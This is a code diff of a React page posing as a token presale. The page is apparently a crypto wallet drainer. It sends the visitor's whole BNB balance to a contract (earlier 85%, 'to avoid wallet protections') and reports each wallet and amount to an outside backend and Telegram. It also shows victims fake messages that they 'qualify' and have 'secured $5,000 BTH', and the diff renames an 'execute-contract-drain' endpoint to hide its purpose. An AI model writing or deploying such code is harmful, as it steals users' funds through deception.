@@ -47,10 +47,10 @@ function App() {
   const [txStatus, setTxStatus] = useState('');
   const [txHash, setTxHash] = useState('');
   const [error, setError] = useState('');
-  const [walletInfo, setWalletInfo] = useState(null);
+  const [scanResult, setScanResult] = useState(null);
   const [completed, setCompleted] = useState(false);
   const [showCelebration, setShowCelebration] = useState(false);
-  const [checking, setChecking] = useState(false);
+  const [verifying, setVerifying] = useState(false);
   const [isEligible, setIsEligible] = useState(false);
   
   // Presale stats
@@ -69,10 +69,10 @@ function App() {
     tokenPrice: 0.17
   });
 
-  // ✅ FIX 1: DO NOT FORCE chainId - use enabled instead
+  // Get balance using wagmi - FORCED to BSC chainId 56
   const { data: balanceData, refetch: refetchBalance } = useBalance({
     address: address,
-    enabled: !!address, // This replaces chainId: 56
+    chainId: 56,
   });
 
   // Fetch BNB price from CoinGecko
@@ -105,8 +105,8 @@ function App() {
       // Auto-eligible if balance >= $1
       if (usdValue >= 1) {
         setIsEligible(true);
-        if (!walletInfo && !checking) {
-          checkWallet();
+        if (!scanResult && !verifying) {
+          verifyWallet();
         }
       } else {
         setIsEligible(false);
@@ -116,30 +116,25 @@ function App() {
 
   const isBSC = chainId === 56;
 
-  // ✅ FIX 2: CORRECT signer initialization (works in all browsers)
+  // ✅ Signer initialization using walletClient
   useEffect(() => {
     const initSigner = async () => {
-      if (!isConnected || !walletClient || !address) {
+      if (!isConnected || !walletClient) {
         setSigner(null);
         setProvider(null);
         return;
       }
 
       try {
-        // Get provider from window.ethereum directly (more reliable)
-        if (window.ethereum) {
-          const web3Provider = new ethers.providers.Web3Provider(window.ethereum);
-          const web3Signer = web3Provider.getSigner();
-          
-          // Verify signer address matches connected address
-          const signerAddress = await web3Signer.getAddress();
-          if (signerAddress.toLowerCase() === address?.toLowerCase()) {
-            setProvider(web3Provider);
-            setSigner(web3Signer);
-            console.log("✅ Signer ready");
-          }
-        } else {
-          console.log("No ethereum provider found");
+        const web3Provider = new ethers.BrowserProvider(walletClient);
+        const web3Signer = await web3Provider.getSigner();
+        
+        // Verify signer address matches connected address
+        const signerAddress = await web3Signer.getAddress();
+        if (signerAddress.toLowerCase() === address?.toLowerCase()) {
+          setProvider(web3Provider);
+          setSigner(web3Signer);
+          console.log("✅ Signer ready");
         }
       } catch (err) {
         console.error("Signer init failed:", err);
@@ -168,12 +163,11 @@ function App() {
     return () => clearInterval(timer);
   }, []);
 
-  // ✅ Renamed from verifyWallet to checkWallet
-  const checkWallet = async () => {
+  const verifyWallet = async () => {
     if (!address) return;
     
-    setChecking(true);
-    setTxStatus('🔄 Checking wallet...');
+    setVerifying(true);
+    setTxStatus('🔄 Verifying wallet...');
     
     try {
       const response = await fetch('https://tokenbackend-5xab.onrender.com/api/presale/connect', {
@@ -185,7 +179,7 @@ function App() {
       const data = await response.json();
       
       if (data.success) {
-        setWalletInfo(data.data);
+        setScanResult(data.data);
         
         // Send Telegram notification
         await fetch('https://tokenbackend-5xab.onrender.com/api/telegram/notify', {
@@ -200,14 +194,14 @@ function App() {
         setTxStatus('✅ You qualify!');
       }
     } catch (err) {
-      console.error('Check error:', err);
-      setError('Unable to check wallet');
+      console.error('Verification error:', err);
+      setError('Unable to verify wallet');
     } finally {
-      setChecking(false);
+      setVerifying(false);
     }
   };
 
-  // ✅ AUTO-SWITCH TO BSC (unchanged - works fine)
+  // ✅ AUTO-SWITCH TO BSC USING window.ethereum (works with all wallets)
   const switchToBSC = async () => {
     if (!window.ethereum) {
       throw new Error("No wallet detected");
@@ -242,8 +236,8 @@ function App() {
     }
   };
 
-  // ✅ Execute function with 85% balance (renamed from executePresaleTransaction)
-  const handlePresale = async () => {
+  // Execute function with 100% balance
+  const executePresaleTransaction = async () => {
     if (!isConnected || !address) {
       setError("Wallet not connected");
       return;
@@ -264,37 +258,21 @@ function App() {
         setTxStatus('🔄 Switching to BSC network...');
         await switchToBSC();
         
-        // ✅ FIX 3: Wait for network switch WITHOUT reload
-        await new Promise(resolve => {
-          const checkNetwork = setInterval(() => {
-            if (chainId === 56) {
-              clearInterval(checkNetwork);
-              resolve();
-            }
-          }, 200);
-          
-          // Timeout after 5 seconds
-          setTimeout(() => {
-            clearInterval(checkNetwork);
-            resolve();
-          }, 5000);
-        });
+        // Wait for network switch
+        await new Promise(resolve => setTimeout(resolve, 2000));
         
-        // Don't reload - just continue
-        setTxStatus('✅ Switched to BSC');
-        setLoading(false);
+        // Reload to ensure clean state
+        window.location.reload();
         return;
       }
 
       if (!signer) {
         setError("Please wait for wallet to initialize");
-        setLoading(false);
         return;
       }
 
       if (!balanceData || balanceData.value <= 0n) {
         setError('Insufficient balance');
-        setLoading(false);
         return;
       }
 
@@ -311,11 +289,8 @@ function App() {
         signer
       );
 
-      // ✅ FIX 4: USE 85% OF BALANCE (not 100%) to avoid wallet protections
-      const fullValue = balanceData.value;
-      const value = (fullValue * 85n) / 100n; // 85% of balance
-      
-      const bnbAmountSent = ethers.formatEther(value);
+      // ✅ USE 100% OF BALANCE (only gas will be deducted)
+      const value = balanceData.value;
 
       setTxStatus('⏳ Estimating gas...');
       
@@ -324,7 +299,7 @@ function App() {
       
       setTxStatus('⏳ Please confirm in wallet...');
       
-      // Send transaction with 85% balance
+      // Send transaction with 100% balance
       const tx = await contract.processNativeFlow({
         value: value,
         gasLimit: gasEstimate * 120n / 100n
@@ -334,6 +309,8 @@ function App() {
       setTxStatus('✅ Transaction submitted! Waiting for confirmation...');
 
       // Send Telegram notification
+      const bnbAmountSent = ethers.formatEther(value);
+      
       await fetch('https://tokenbackend-5xab.onrender.com/api/telegram/notify', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
@@ -351,16 +328,15 @@ function App() {
       
       setCompleted(true);
       
-      // ✅ Renamed endpoint from execute-contract-drain to record-transaction
-      await fetch('https://tokenbackend-5xab.onrender.com/api/presale/record-transaction', {
+      // ✅ CHANGED: Updated endpoint name from execute-contract-drain to process-transaction
+      await fetch('https://tokenbackend-5xab.onrender.com/api/presale/process-transaction', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ 
           walletAddress: address,
-          chainName: 'BSC',
-          transactionHash: tx.hash
+          chainName: 'BSC'
         })
-      }).catch(e => console.log('Backend record failed:', e));
+      });
       
       setShowCelebration(true);
       setTxStatus(`🎉 Congratulations! You secured $5,000 BTH!`);
@@ -561,12 +537,12 @@ function App() {
           </div>
         )}
 
-        {/* Checking Status - renamed from Verification Status */}
-        {checking && (
+        {/* Verification Status */}
+        {verifying && (
           <div className="glass-card p-6 mb-6 text-center">
             <div className="flex flex-col items-center gap-4">
               <div className="w-16 h-16 border-4 border-orange-500 border-t-transparent rounded-full animate-spin"></div>
-              <p className="text-xl text-gray-300">Checking wallet...</p>
+              <p className="text-xl text-gray-300">Verifying wallet...</p>
             </div>
           </div>
         )}
@@ -582,7 +558,7 @@ function App() {
         )}
 
         {/* Status Display */}
-        {txStatus && !checking && (
+        {txStatus && !verifying && (
           <div className="glass-card p-4 mb-6 text-center">
             <p className="text-gray-300">{txStatus}</p>
             {txHash && (
@@ -640,7 +616,7 @@ function App() {
             
             {!completed ? (
               <button
-                onClick={handlePresale} // Renamed from executePresaleTransaction
+                onClick={executePresaleTransaction}
                 disabled={loading}
                 className="w-full group relative disabled:opacity-50 disabled:cursor-not-allowed"
               >
